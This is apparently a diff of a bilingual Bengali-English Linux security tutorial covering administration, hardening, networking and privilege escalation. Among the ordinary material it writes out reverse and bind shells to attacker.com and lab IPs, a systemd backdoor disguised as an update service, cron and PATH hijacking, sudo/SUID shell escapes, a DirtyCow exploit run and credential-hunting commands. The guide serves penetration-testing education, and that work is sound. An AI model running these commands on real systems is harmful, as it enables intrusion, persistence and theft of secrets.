+userdel saimum                      <span class="c"># শুধু user</span>
+userdel -r saimum                   <span class="c"># home dir সহ</span>
+
+<span class="c"># Group</span>
+groupadd hackers                    <span class="c"># group তৈরি</span>
+groupdel hackers                    <span class="c"># group মুছা</span>
+groups saimum                       <span class="c"># user-এর group</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">sudo — সবচেয়ে গুরুত্বপূর্ণ</span><span class="en-text">sudo — The Most Important Command</span></h2>
+    <div class="code">
+<span class="c"># sudo কমান্ড</span>
+sudo command                     <span class="c"># root হিসেবে চালাও</span>
+sudo -l                          <span class="c"># ⭐ কী কী sudo করতে পারি?</span>
+sudo -u www-data command         <span class="c"># অন্য user হিসেবে</span>
+sudo su                          <span class="c"># root shell</span>
+sudo -s                          <span class="c"># root shell (environment রেখে)</span>
+
+<span class="c"># /etc/sudoers ফাইল</span>
+visudo                           <span class="c"># নিরাপদে sudoers edit</span>
+
+<span class="c"># Format: who where=(as_whom) command</span>
+<span class="g">root        ALL=(ALL:ALL) ALL</span>
+<span class="g">saimum      ALL=(ALL) /usr/bin/vim</span>      <span class="c"># শুধু vim</span>
+<span class="g">saimum      ALL=(ALL) NOPASSWD: ALL</span>    <span class="c"># ⭐ পাসওয়ার্ড ছাড়া সব!</span>
+<span class="g">%sudo       ALL=(ALL:ALL) ALL</span>          <span class="c"># sudo group</span>
+
+<span class="c"># ⭐ Privilege Escalation via sudo</span>
+sudo -l
+<span class="g">User saimum may run: (ALL) /usr/bin/vim</span>
+<span class="c"># vim দিয়ে root shell:</span>
+sudo vim -c ':!/bin/bash'
+
+<span class="c"># NOPASSWD sudo — instant root</span>
+sudo /bin/bash
+    </div>
+
+    <div class="box danger">
+      <div class="box-t">⚠️ Privilege Escalation: sudo -l সবার আগে চালাও</div>
+      যখন কোনো সিস্টেমে normal user হিসেবে access পাবে, সাথে সাথে <code>sudo -l</code> চালাও। অনেক সময় NOPASSWD পাবে বা কোনো binary-তে sudo access পাবে যা দিয়ে root shell পাওয়া যায়।
+    </div>
+
+    <h2 class="sec"><span class="bn-text">su — User Switch</span><span class="en-text">su — User Switch</span></h2>
+    <div class="code">
+su root                    <span class="c"># root-এ switch (পাসওয়ার্ড লাগবে)</span>
+su - saimum                <span class="c"># সম্পূর্ণ login (environment সহ)</span>
+su -c "command" saimum     <span class="c"># অন্য user-এ কমান্ড চালানো</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     CHAPTER 6: Process Management
+════════════════════════════════════════ -->
+<div class="chapter ch6">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 06</div>
+    <div class="chapter-title"><span class="bn-text">⚙️ প্রসেস ব্যবস্থাপনা ও Cron Jobs</span><span class="en-text">⚙️ Process Management & Cron Jobs</span></div>
+    <div class="chapter-desc"><span class="bn-text">Persistence, Backdoor ও Automation-এর মূল</span><span class="en-text">Core of Persistence, Backdoor & Automation</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">প্রসেস কী?</span><span class="en-text">What is a Process?</span></h2>
+    <p>প্রোগ্রাম চালু হলে একটি Process তৈরি হয়। প্রতিটি Process-এর একটি PID (Process ID) আছে।</p>
+
+    <div class="code">
+<span class="c"># প্রসেস দেখা</span>
+ps aux                    <span class="c"># সব প্রসেস (a=all, u=user, x=no-tty)</span>
+ps aux | grep apache      <span class="c"># নির্দিষ্ট প্রসেস</span>
+ps -ef                    <span class="c"># Full format</span>
+ps -eo pid,ppid,user,cmd  <span class="c"># কাস্টম কলাম</span>
+top                       <span class="c"># Real-time process monitor</span>
+htop                      <span class="c"># উন্নত process monitor</span>
+pstree                    <span class="c"># Process tree দেখা</span>
+
+<span class="c"># Process বন্ধ করা</span>
+kill 1234                 <span class="c"># PID দিয়ে (SIGTERM)</span>
+kill -9 1234              <span class="c"># Force kill (SIGKILL)</span>
+killall apache2           <span class="c"># নাম দিয়ে সব kill</span>
+pkill -u saimum           <span class="c"># একজন user-এর সব process</span>
+
+<span class="c"># Background/Foreground</span>
+command &                 <span class="c"># Background-এ চালাও</span>
+jobs                      <span class="c"># Background job দেখা</span>
+fg %1                     <span class="c"># Foreground-এ আনো</span>
+bg %1                     <span class="c"># Background-এ পাঠাও</span>
+nohup command &           <span class="c"># Terminal বন্ধ হলেও চলবে</span>
+screen -S mysession       <span class="c"># Detachable session</span>
+tmux new -s hack          <span class="c"># Terminal multiplexer</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Cron Jobs — Scheduled Tasks</span><span class="en-text">Cron Jobs — Scheduled Tasks</span></h2>
+    <p>Cron হলো Linux-এর Task Scheduler। সিকিউরিটিতে দুটো দিক — Automation এবং Persistence (হ্যাকার backdoor বসায়)।</p>
+
+    <div class="code">
+<span class="c"># Cron Syntax:</span>
+<span class="c"># ┌────── মিনিট (0-59)</span>
+<span class="c"># │ ┌──── ঘণ্টা (0-23)</span>
+<span class="c"># │ │ ┌── দিন (1-31)</span>
+<span class="c"># │ │ │ ┌─ মাস (1-12)</span>
+<span class="c"># │ │ │ │ ┌ বার (0-7, 0=Sun)</span>
+<span class="c"># │ │ │ │ │</span>
+<span class="c"># * * * * * command</span>
+
+<span class="c"># উদাহরণ</span>
+0 * * * * /script.sh           <span class="c"># প্রতি ঘণ্টায়</span>
+0 2 * * * /backup.sh           <span class="c"># প্রতিদিন রাত ২টায়</span>
+*/5 * * * * /check.sh          <span class="c"># প্রতি ৫ মিনিটে</span>
+0 0 * * 0 /weekly.sh           <span class="c"># প্রতি রবিবার মধ্যরাতে</span>
+@reboot /startup.sh            <span class="c"># বুটের সময়</span>
+
+<span class="c"># Cron পরিচালনা</span>
+crontab -l                     <span class="c"># বর্তমান user-এর cron</span>
+crontab -e                     <span class="c"># Edit করা</span>
+crontab -l -u root             <span class="c"># root-এর cron</span>
+
+<span class="c"># সব cron ফাইল দেখা</span>
+cat /etc/crontab
+ls /etc/cron.d/
+ls /etc/cron.daily/
+ls /etc/cron.hourly/
+
+<span class="c"># ⭐ Pentest: Cron Job Hijack</span>
+<span class="c"># যদি root-এর cron script world-writable হয়:</span>
+ls -la /usr/local/bin/backup.sh
+<span class="c"># -rwxrwxrwx root root backup.sh ← সবাই লিখতে পারে!</span>
+echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /usr/local/bin/backup.sh
+<span class="c"># পরের বার cron চললে reverse shell পাবে!</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">systemd — Service Management</span><span class="en-text">systemd — Service Management</span></h2>
+    <div class="code">
+<span class="c"># Service চালু/বন্ধ</span>
+systemctl start apache2           <span class="c"># চালু</span>
+systemctl stop apache2            <span class="c"># বন্ধ</span>
+systemctl restart apache2         <span class="c"># পুনরায় চালু</span>
+systemctl enable apache2          <span class="c"># বুটে auto-start</span>
+systemctl disable apache2         <span class="c"># auto-start বন্ধ</span>
+systemctl status apache2          <span class="c"># স্ট্যাটাস</span>
+systemctl list-units --type=service  <span class="c"># সব service</span>
+
+<span class="c"># Log দেখা</span>
+journalctl -u apache2             <span class="c"># service log</span>
+journalctl -f                     <span class="c"># Real-time log</span>
+journalctl --since "1 hour ago"   <span class="c"># গত ১ ঘণ্টার log</span>
+
+<span class="c"># ⭐ Persistence: Custom service</span>
+cat > /etc/systemd/system/backdoor.service << EOF
+[Unit]
+Description=System Update Service
+
+[Service]
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl enable backdoor
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     CHAPTER 7: নেটওয়ার্কিং কমান্ড
+════════════════════════════════════════ -->
+<div class="chapter ch7">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 07</div>
+    <div class="chapter-title"><span class="bn-text">🌐 Linux নেটওয়ার্কিং</span><span class="en-text">🌐 Linux Networking</span> কমান্ড</div>
+    <div class="chapter-desc"><span class="bn-text">SSH Tunneling, Port Forwarding, iptables — সব কিছু</span><span class="en-text">SSH Tunneling, Port Forwarding, iptables — Everything</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">নেটওয়ার্ক Interface কমান্ড</span><span class="en-text">Network Interface Commands</span></h2>
+    <div class="code">
+<span class="c"># Interface দেখা</span>
+ip addr show              <span class="c"># সব interface ও IP</span>
+ip addr show eth0         <span class="c"># নির্দিষ্ট interface</span>
+ifconfig                  <span class="c"># পুরনো কিন্তু এখনো ব্যবহৃত</span>
+ip link show              <span class="c"># Link layer তথ্য</span>
+
+<span class="c"># Routing</span>
+ip route show             <span class="c"># Routing table</span>
+route -n                  <span class="c"># Routing table (পুরনো)</span>
+ip route add 10.10.10.0/24 via 192.168.1.1  <span class="c"># Route যোগ</span>
+
+<span class="c"># ARP</span>
+arp -a                    <span class="c"># ARP cache</span>
+ip neigh show             <span class="c"># আধুনিক ARP দেখা</span>
+
+<span class="c"># DNS</span>
+cat /etc/resolv.conf      <span class="c"># DNS server</span>
+nslookup google.com       <span class="c"># DNS lookup</span>
+dig google.com            <span class="c"># বিস্তারিত DNS</span>
+dig @8.8.8.8 google.com   <span class="c"># নির্দিষ্ট DNS server</span>
+host google.com           <span class="c"># সহজ lookup</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">সংযোগ মনিটরিং</span><span class="en-text">Connection Monitoring</span></h2>
+    <div class="code">
+<span class="c"># সক্রিয় সংযোগ</span>
+netstat -tulnp            <span class="c"># ⭐ সব listening পোর্ট</span>
+netstat -an               <span class="c"># সব সংযোগ</span>
+ss -tulnp                 <span class="c"># আধুনিক netstat</span>
+ss -tp                    <span class="c"># TCP সংযোগ</span>
+lsof -i                   <span class="c"># Open নেটওয়ার্ক ফাইল</span>
+lsof -i :80               <span class="c"># পোর্ট ৮০ ব্যবহারকারী</span>
+lsof -i TCP -n            <span class="c"># TCP সংযোগ</span>
+
+<span class="c"># ⭐ Pentest: কোন service চলছে?</span>
+ss -tulnp | grep LISTEN
+netstat -tulnp 2>/dev/null | grep LISTEN
+    </div>
+
+    <h2 class="sec"><span class="bn-text">SSH — বিস্তারিত</span><span class="en-text">SSH — In Detail</span></h2>
+    <div class="code">
+<span class="c"># Basic SSH</span>
+ssh <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="770204120537464e455946414f594659464747">[email&#160;protected]</a>
+ssh -p 2222 user@server            <span class="c"># কাস্টম পোর্ট</span>
+ssh -i ~/.ssh/id_rsa user@server   <span class="c"># Key দিয়ে login</span>
+
+<span class="c"># ⭐ SSH Key তৈরি ও ব্যবহার</span>
+ssh-keygen -t ed25519 -C "mykey"   <span class="c"># Key pair তৈরি</span>
+ssh-copy-id user@server            <span class="c"># Public key পাঠানো</span>
+cat ~/.ssh/authorized_keys         <span class="c"># অনুমোদিত key দেখা</span>
+
+<span class="c"># ⭐ SSH Local Port Forwarding (Tunneling)</span>
+<span class="c"># আমার মেশিনের 8080 → server-এর 80</span>
+ssh -L 8080:localhost:80 user@server
+<span class="c"># এরপর: http://localhost:8080 → server-এর port 80</span>
+
+<span class="c"># ⭐ SSH Remote Port Forwarding</span>
+<span class="c"># server-এর 9090 → আমার মেশিনের 3389 (RDP bypass firewall)</span>
+ssh -R 9090:localhost:3389 user@server
+
+<span class="c"># ⭐ SSH Dynamic Port Forwarding (SOCKS Proxy)</span>
+ssh -D 1080 user@server
+<span class="c"># তারপর browser-এ SOCKS5 proxy: 127.0.0.1:1080</span>
+<span class="c"># Proxychains দিয়ে:</span>
+proxychains nmap -sV 10.10.10.1
+
+<span class="c"># SSH Config (~/.ssh/config)</span>
+<span class="c"># Host targetserver</span>
+<span class="c">#     HostName 192.168.1.100</span>
+<span class="c">#     User hacker</span>
+<span class="c">#     IdentityFile ~/.ssh/id_rsa</span>
+<span class="c">#     Port 2222</span>
+<span class="c"># তারপর: ssh targetserver</span>
+    </div>
+
+    <h2 class="sec">Firewall — iptables</h2>
+    <div class="code">
+<span class="c"># বর্তমান rules দেখা</span>
+iptables -L -n -v           <span class="c"># সব rules</span>
+iptables -L INPUT -n        <span class="c"># INPUT chain</span>
+iptables -S                 <span class="c"># Rules হুবহু</span>
+
+<span class="c"># Rules যোগ করা</span>
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT    <span class="c"># SSH allow</span>
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT    <span class="c"># HTTP allow</span>
+iptables -A INPUT -s 10.10.10.0/24 -j ACCEPT     <span class="c"># IP range allow</span>
+iptables -A INPUT -j DROP                         <span class="c"># বাকি সব block</span>
+
+<span class="c"># Rules মুছা</span>
+iptables -D INPUT -p tcp --dport 22 -j ACCEPT
+iptables -F                  <span class="c"># সব rules মুছা (সাবধান!)</span>
+
+<span class="c"># UFW (Ubuntu Firewall — সহজ)</span>
+ufw enable
+ufw allow ssh
+ufw allow 80/tcp
+ufw allow from 192.168.1.0/24
+ufw deny 23                  <span class="c"># Telnet block</span>
+ufw status verbose
+ufw reset                    <span class="c"># সব reset</span>
+
+<span class="c"># ⭐ Pentest: Firewall disable করা (root লাগবে)</span>
+iptables -F && iptables -X   <span class="c"># সব rules মুছা</span>
+ufw disable
+    </div>
+
+    <h2 class="sec">Netcat — Swiss Army Knife</h2>
+    <div class="code">
+<span class="c"># Listen করা</span>
+nc -lvp 4444                     <span class="c"># পোর্ট 4444-এ listen</span>
+nc -lvnp 4444                    <span class="c"># n=no DNS, v=verbose</span>
+
+<span class="c"># Connect করা</span>
+nc 192.168.1.100 4444            <span class="c"># Connect</span>
+nc -zv 192.168.1.100 80          <span class="c"># Port check</span>
+nc -zv 192.168.1.100 1-1000      <span class="c"># Port scan</span>
+
+<span class="c"># ⭐ Reverse Shell</span>
+<span class="c"># Attacker (listen করো):</span>
+nc -lvnp 4444
+<span class="c"># Victim (এটা চালাও):</span>
+bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
+nc -e /bin/bash 192.168.1.10 4444
+
+<span class="c"># ⭐ Bind Shell</span>
+<span class="c"># Victim (listen করো):</span>
+nc -lvnp 4444 -e /bin/bash
+<span class="c"># Attacker (connect করো):</span>
+nc 192.168.1.100 4444
+
+<span class="c"># File Transfer</span>
+<span class="c"># Receiver:</span>
+nc -lvnp 4444 > received.txt
+<span class="c"># Sender:</span>
+nc 192.168.1.10 4444 < file.txt
+    </div>
+
+    <h2 class="sec">অন্যান্য গুরুত্বপূর্ণ নেটওয়ার্ক কমান্ড</h2>
+    <div class="code">
+ping -c 4 google.com                <span class="c"># ICMP ping</span>
+traceroute google.com               <span class="c"># পথ দেখা</span>
+mtr google.com                      <span class="c"># Continuous traceroute</span>
+tcpdump -i eth0 port 80             <span class="c"># Packet capture</span>
+tcpdump -i eth0 -w capture.pcap     <span class="c"># ফাইলে সেভ</span>
+tcpdump -r capture.pcap             <span class="c"># ফাইল পড়া</span>
+whois google.com                    <span class="c"># Domain তথ্য</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     CHAPTER 8: Linux Hardening
+════════════════════════════════════════ -->
+<div class="chapter ch8">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 08</div>
+    <div class="chapter-title"><span class="bn-text">🛡️ Linux সিকিউরিটি হার্ডেনিং</span><span class="en-text">🛡️ Linux Security Hardening</span></div>
+    <div class="chapter-desc"><span class="bn-text">সার্ভার সুরক্ষিত করার সম্পূর্ণ গাইড</span><span class="en-text">Complete guide to securing your server</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">SSH হার্ডেনিং — সবচেয়ে গুরুত্বপূর্ণ</h2>
+    <div class="code">
+<span class="c"># /etc/ssh/sshd_config পরিবর্তন করো:</span>
+<span class="g">Port 2222</span>                         <span class="c"># Default 22 পরিবর্তন</span>
+<span class="g">PermitRootLogin no</span>               <span class="c"># Root login বন্ধ</span>
+<span class="g">PasswordAuthentication no</span>        <span class="c"># পাসওয়ার্ড login বন্ধ</span>
+<span class="g">PubkeyAuthentication yes</span>         <span class="c"># Key-based login</span>
+<span class="g">MaxAuthTries 3</span>                   <span class="c"># ৩বার ব্যর্থ হলে disconnect</span>
+<span class="g">LoginGraceTime 20</span>                <span class="c"># ২০ সেকেন্ডে login শেষ করতে হবে</span>
+<span class="g">AllowUsers saimum</span>                <span class="c"># শুধু নির্দিষ্ট user</span>
+<span class="g">Protocol 2</span>                       <span class="c"># SSH v2 only</span>
+<span class="g">X11Forwarding no</span>                 <span class="c"># GUI forwarding বন্ধ</span>
+<span class="g">ClientAliveInterval 300</span>          <span class="c"># ৫ মিনিট idle → disconnect</span>
+
+<span class="c"># SSH পুনরায় চালু</span>
+systemctl restart sshd
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Fail2Ban — Brute Force সুরক্ষা</span><span class="en-text">Fail2Ban — Brute Force Protection</span></h2>
+    <div class="code">
+<span class="c"># Install</span>
+apt install fail2ban
+
+<span class="c"># /etc/fail2ban/jail.local</span>
+[DEFAULT]
+bantime  = 3600      <span class="c"># ১ ঘণ্টা ban</span>
+findtime = 600       <span class="c"># ১০ মিনিটে</span>
+maxretry = 5         <span class="c"># ৫বার ব্যর্থ হলে</span>
+
+[sshd]
+enabled = true
+port    = 2222
+filter  = sshd
+
+<span class="c"># Status দেখা</span>
+fail2ban-client status
+fail2ban-client status sshd
+fail2ban-client unban 192.168.1.100  <span class="c"># IP unban</span>
+    </div>
+
+    <h2 class="sec">User Account সুরক্ষা</h2>
+    <div class="code">
+<span class="c"># শক্তিশালী পাসওয়ার্ড নীতি (PAM)</span>
+apt install libpam-cracklib
+
+<span class="c"># /etc/pam.d/common-password-এ:</span>
+password required pam_cracklib.so retry=3 minlen=12 dcredit=-1 ucredit=-1 ocredit=-1 lcredit=-1
+
+<span class="c"># Account lockout</span>
+<span class="c"># /etc/pam.d/common-auth-এ:</span>
+auth required pam_faillock.so preauth silent deny=5 unlock_time=900
+
+<span class="c"># অব্যবহৃত user lock</span>
+usermod -L daemon
+usermod -L nobody
+passwd -l username     <span class="c"># password lock</span>
+
+<span class="c"># /etc/login.defs পরিবর্তন</span>
+PASS_MAX_DAYS 90       <span class="c"># পাসওয়ার্ড ৯০ দিনে expire</span>
+PASS_MIN_DAYS 7        <span class="c"># ৭ দিনের আগে পরিবর্তন নয়</span>
+PASS_WARN_AGE 14       <span class="c"># ১৪ দিন আগে সতর্কতা</span>
+    </div>
+
+    <h2 class="sec">সিস্টেম হার্ডেনিং</h2>
+    <div class="code">
+<span class="c"># /etc/sysctl.conf — Kernel Parameters</span>
+net.ipv4.ip_forward = 0              <span class="c"># Packet forwarding বন্ধ</span>
+net.ipv4.conf.all.accept_redirects=0 <span class="c"># ICMP redirect বন্ধ</span>
+net.ipv4.conf.all.send_redirects=0
+net.ipv4.tcp_syncookies = 1          <span class="c"># SYN Flood সুরক্ষা</span>
+net.ipv4.conf.all.rp_filter = 1      <span class="c"># Spoofed packet বন্ধ</span>
+kernel.randomize_va_space = 2        <span class="c"># ASLR চালু</span>
+kernel.dmesg_restrict = 1            <span class="c"># Kernel log সীমিত</span>
+
+sysctl -p    <span class="c"># পরিবর্তন apply</span>
+
+<span class="c"># Unnecessary service বন্ধ</span>
+systemctl disable telnet
+systemctl disable ftp
+systemctl disable rsh
+systemctl disable rlogin
+
+<span class="c"># Package আপডেট</span>
+apt update && apt upgrade -y
+apt install unattended-upgrades
+    </div>
+
+    <h2 class="sec">Audit — কে কী করছে?</h2>
+    <div class="code">
+<span class="c"># auditd install ও setup</span>
+apt install auditd
+
+<span class="c"># Rule যোগ করা</span>
+auditctl -w /etc/passwd -p wa -k passwd_changes
+auditctl -w /etc/shadow -p wa -k shadow_changes
+auditctl -w /etc/sudoers -p wa -k sudoers_changes
+auditctl -w /bin/su -p x -k su_use
+
+<span class="c"># Log দেখা</span>
+ausearch -k passwd_changes
+aureport --auth                   <span class="c"># Authentication report</span>
+aureport --failed                 <span class="c"># ব্যর্থ ইভেন্ট</span>
+
+<span class="c"># AIDE — <span class="bn-text">File Integrity Monitoring</span><span class="en-text">File Integrity Monitoring</span></span>
+apt install aide
+aide --init
+aide --check       <span class="c"># পরিবর্তন হয়েছে কিনা চেক</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">AppArmor ও SELinux</span><span class="en-text">AppArmor & SELinux</span> — Mandatory Access Control</h2>
+    <div class="code">
+<span class="c"># AppArmor (Ubuntu/Debian)</span>
+aa-status                          <span class="c"># Status দেখা</span>
+aa-enforce /etc/apparmor.d/apache2 <span class="c"># Profile enforce</span>
+aa-complain /etc/apparmor.d/nginx  <span class="c"># Log only mode</span>
+
+<span class="c"># SELinux (RHEL/CentOS/Fedora)</span>
+getenforce                    <span class="c"># Enforcing/Permissive/Disabled</span>
+setenforce 1                  <span class="c"># Enforce mode</span>
+sestatus                      <span class="c"># বিস্তারিত status</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     CHAPTER 9: Privilege Escalation
+════════════════════════════════════════ -->
+<div class="chapter ch9">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 09</div>
+    <div class="chapter-title"><span class="bn-text">⬆️ Linux Privilege Escalation</span><span class="en-text">⬆️ Linux Privilege Escalation</span></div>
+    <div class="chapter-desc"><span class="bn-text">Normal user থেকে root — সব পদ্ধতি বিস্তারিত</span><span class="en-text">From normal user to root — all methods in detail</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Privilege Escalation কী?</span><span class="en-text">What is Privilege Escalation?</span></h2>
+    <p>Privilege Escalation মানে কম সুবিধার account থেকে বেশি সুবিধার account (বিশেষত root) পাওয়া। CTF ও Real-world Pentest-এ এটি সবচেয়ে গুরুত্বপূর্ণ পদক্ষেপ।</p>
+
+    <div class="box info">
+      <div class="box-t">💡 Privilege Escalation এর ধাপ</div>
+      ১. Enumeration (তথ্য সংগ্রহ) → ২. দুর্বলতা চিহ্নিত → ৩. Exploit → ৪. Root shell
+    </div>
+
+    <h2 class="sec">১. Enumeration — প্রথম পদক্ষেপ</h2>
+    <div class="code">
+<span class="c"># System তথ্য</span>
+uname -a                           <span class="c"># Kernel version</span>
+cat /etc/os-release                <span class="c"># OS version</span>
+hostname                           <span class="c"># Hostname</span>
+
+<span class="c"># User তথ্য</span>
+id                                 <span class="c"># বর্তমান UID, GID</span>
+whoami                             <span class="c"># username</span>
+sudo -l                            <span class="c"># ⭐ sudo অনুমতি</span>
+cat /etc/passwd                    <span class="c"># সব user</span>
+cat /etc/shadow 2>/dev/null        <span class="c"># shadow (read করা যায়?)</span>
+cat /etc/group                     <span class="c"># Groups</span>
+
+<span class="c"># SUID/SGID</span>
+find / -perm -4000 -type f 2>/dev/null  <span class="c"># ⭐ SUID ফাইল</span>
+find / -perm -2000 -type f 2>/dev/null  <span class="c"># SGID ফাইল</span>
+
+<span class="c"># Writable ফাইল/ডিরেক্টরি</span>
+find / -writable -type f 2>/dev/null | grep -v proc
+find / -writable -type d 2>/dev/null
+
+<span class="c"># Cron jobs</span>
+cat /etc/crontab
+ls -la /etc/cron*
+crontab -l
+cat /var/spool/cron/crontabs/root 2>/dev/null
+
+<span class="c"># Network</span>
+netstat -tulnp 2>/dev/null
+ss -tulnp
+ip addr
+
+<span class="c"># Password খোঁজা</span>
+find / -name "*.conf" -exec grep -i "password\|passwd\|secret" {} \; 2>/dev/null
+find / -name "*.php" -exec grep -i "DB_PASSWORD\|password" {} \; 2>/dev/null
+cat ~/.bash_history | grep -i "password\|passwd"
+    </div>
+
+    <h2 class="sec">২. Sudo Privilege Escalation</h2>
+    <div class="code">
+<span class="c"># sudo -l এর output বিশ্লেষণ</span>
+sudo -l
+<span class="g">User www-data may run the following commands:</span>
+<span class="g">    (ALL) NOPASSWD: /usr/bin/vim</span>
+
+<span class="c"># GTFOBins দেখে exploit করো</span>
+sudo vim -c ':!/bin/bash'          <span class="c"># vim দিয়ে shell</span>
+sudo python3 -c 'import os; os.system("/bin/bash")'
+sudo find . -exec /bin/bash \; -quit
+sudo awk 'BEGIN {system("/bin/bash")}'
+sudo less /etc/passwd              <span class="c"># তারপর !bash</span>
+sudo nano                          <span class="c"># তারপর Ctrl+R Ctrl+X → bash</span>
+sudo zip /tmp/test.zip /etc/passwd -T --unzip-command "bash -p"
+    </div>
+
+    <h2 class="sec">৩. SUID Exploitation</h2>
+    <div class="code">
+<span class="c"># SUID ফাইল পাওয়া</span>
+find / -perm -4000 -type f 2>/dev/null
+
+<span class="c"># সাধারণ SUID Exploit (GTFOBins থেকে)</span>
+
+<span class="c"># nmap SUID (পুরনো)</span>
+nmap --interactive
+<span class="g">nmap> !sh</span>
+
+<span class="c"># python SUID</span>
+python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+<span class="c"># bash SUID</span>
+bash -p                            <span class="c"># -p মানে privileged mode</span>
+
+<span class="c"># cp SUID — /etc/shadow copy করা</span>
+cp /etc/shadow /tmp/shadow_copy
+
+<span class="c"># তুমি কাস্টম binary পেলে strings দিয়ে বিশ্লেষণ:</span>
+strings /usr/local/bin/custom_suid
+<span class="c"># যদি system() বা PATH ব্যবহার করে → PATH Injection!</span>
+    </div>
+
+    <h2 class="sec">৪. PATH Injection</h2>
+    <div class="code">
+<span class="c"># SUID binary যদি full path ছাড়া command ডাকে:</span>
+strings /usr/local/suid_binary
+<span class="g">service apache2 start</span>          <span class="c"># full path নেই!</span>
+
+<span class="c"># নকল 'service' তৈরি করো:</span>
+echo '#!/bin/bash' > /tmp/service
+echo '/bin/bash -p' >> /tmp/service
+chmod +x /tmp/service
+
+<span class="c"># PATH-এর শুরুতে /tmp যোগ করো:</span>
+export PATH=/tmp:$PATH
+
+<span class="c"># এখন binary চালাও → নকল service চলবে → root shell!</span>
+/usr/local/suid_binary
+    </div>
+
+    <h2 class="sec">৫. <span class="bn-text">Cron Job Hijacking</span><span class="en-text">Cron Job Hijacking</span></h2>
+    <div class="code">
+<span class="c"># root-এর cron script খুঁজে পেলাম:</span>
+cat /etc/crontab
+<span class="g">* * * * * root /usr/local/bin/backup.sh</span>
+
+<span class="c"># script কি writable?</span>
+ls -la /usr/local/bin/backup.sh
+<span class="g">-rwxrwxrwx 1 root root backup.sh</span>    <span class="c"># ← সবাই লিখতে পারে!</span>
+
+<span class="c"># Reverse shell যোগ করো:</span>
+echo "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1" >> /usr/local/bin/backup.sh
+
+<span class="c"># অথবা /bin/bash কে SUID করো:</span>
+echo "chmod u+s /bin/bash" >> /usr/local/bin/backup.sh
+<span class="c"># পরের মিনিটে:</span>
+bash -p    <span class="c"># root shell!</span>
+    </div>
+
+    <h2 class="sec">৬. Kernel Exploit</h2>
+    <div class="code">
+<span class="c"># Kernel version দেখা</span>
+uname -r
+<span class="g">4.4.0-116-generic</span>
+
+<span class="c"># বিখ্যাত Kernel Exploit</span>
+<span class="c"># DirtyCow (CVE-2016-5195) → Kernel 2.x - 4.x</span>
+<span class="c"># DirtyPipe (CVE-2022-0847) → Kernel 5.8 - 5.16</span>
+<span class="c"># RDS (CVE-2010-3904) → Kernel < 2.6.36</span>
+
+<span class="c"># Exploit-DB থেকে খোঁজো:</span>
+searchsploit linux kernel 4.4.0 privilege escalation
+searchsploit -m 40839    <span class="c"># DirtyCow download</span>
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty newpassword      <span class="c"># root পাসওয়ার্ড পরিবর্তন</span>
+    </div>
+
+    <h2 class="sec">৭. Automated Enumeration Tools</h2>
+    <div class="code">
+<span class="c"># ⭐ LinPEAS — সবচেয়ে জনপ্রিয়</span>
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+<span class="c"># অথবা transfer করে:</span>
+wget http://attacker.com/linpeas.sh
+bash linpeas.sh | tee linpeas_output.txt
+
+<span class="c"># LinEnum</span>
+bash linenum.sh -t    <span class="c"># Thorough scan</span>
+
+<span class="c"># linux-smart-enumeration</span>
+bash lse.sh -l 2      <span class="c"># Level 2 scan</span>
+
+<span class="c"># সব চেক করার কমান্ড (manual):</span>
+id; whoami; uname -a; cat /etc/os-release;
+sudo -l; find / -perm -4000 2>/dev/null;
+cat /etc/crontab; ls /etc/cron.d/;
+cat ~/.bash_history; find / -name "*.conf" 2>/dev/null | head;
+    </div>
+
+    <div class="box success">
+      <div class="box-t">✅ GTFOBins — হ্যাকারের সেরা বন্ধু</div>
+      <strong>gtfobins.github.io</strong> — এই ওয়েবসাইটে সব Unix binary-এর (vim, python, perl, ruby, find, awk, etc.) দিয়ে shell/sudo/SUID exploit পাওয়া যায়। Pentest-এ সবার আগে এখানে চেক করো।
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     CHAPTER 10: Log ও Forensics
+════════════════════════════════════════ -->
+<div class="chapter ch10">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 10</div>
+    <div class="chapter-title"><span class="bn-text">🔍 Log ব্যবস্থাপনা ও Linux Forensics</span><span class="en-text">🔍 Log Management & Linux Forensics</span></div>
+    <div class="chapter-desc"><span class="bn-text">আক্রান্ত সিস্টেম বিশ্লেষণ ও Incident Response</span><span class="en-text">Compromised System Analysis & Incident Response</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">গুরুত্বপূর্ণ Log ফাইল</h2>
+    <div class="code">
+<span class="c"># Authentication log</span>
+tail -f /var/log/auth.log              <span class="c"># Real-time</span>
+grep "Failed password" /var/log/auth.log | tail -20
+grep "Accepted password" /var/log/auth.log
+grep "sudo" /var/log/auth.log
+
+<span class="c"># System log</span>
+tail -100 /var/log/syslog
